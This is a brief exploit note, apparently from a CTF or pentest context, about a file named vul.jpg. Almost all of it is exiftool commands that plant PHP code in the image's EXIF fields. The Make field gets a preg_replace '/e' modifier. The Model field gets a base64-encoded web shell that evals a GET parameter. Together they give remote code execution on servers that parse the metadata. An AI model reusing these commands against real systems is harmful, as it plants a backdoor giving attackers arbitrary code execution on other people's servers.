Analysis: vulnerability in vul.jpg

Exploit:
```
sudo apt install exiftool
exiftool "-make=/.*/e" vul.jpg
exiftool "-model=eval(base64_decode('aWYgKGlzc2V0KCRfR0VUWyIxIl0pKSB7ZXZhbCgkX0dFVFsiMSJdKTt9'));" vul.jpg
```